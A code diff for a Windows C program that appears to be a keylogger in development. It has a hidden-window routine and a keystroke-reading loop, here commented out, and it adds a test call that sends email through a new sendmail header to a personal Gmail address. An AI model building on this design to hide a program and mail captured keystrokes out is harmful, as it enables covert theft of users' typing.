@@ -2,7 +2,9 @@
 #include <stdio.h>
 #include <windows.h>
 #include <locale.h>
-#include <winsock2.h>
+#include <time.h>
+#include <string.h>
+#include "include/sendmail.h"
 
 void getWords();
 int fileExists(char *file);
@@ -14,11 +16,13 @@ int main(int argc, char* argv[])
 	// ShowWindow(GetForegroundWindow(), SW_HIDE);
 	// hiddenProgram(argv[0]);	
 
-	while(1)
-	{
-		Sleep(1);
-		getWords();
-	}
+	sendEmail("marlonnlm.026@gmail.com", "marlonmln.026@gmail.com", "Ola, estou testando meu app stmp", "Qualquer coisa, de fato nao importa, haha!");
+	system("pause");
+	// while(1)
+	// {
+	// 	Sleep(1);
+	// 	getWords();
+	// }
 	return 0;
 }
 
@@ -75,7 +79,7 @@ int fileExists(char *file)
 
 // Função para tratar as teclas não alfa-numericas. (',' , '|', 'ç' , ';'...)
 char convertAscii(int codAscii){
-	char tecla = '';
+	char tecla;
 
 	switch(codAscii){
 		case 187: tecla = '='; break;
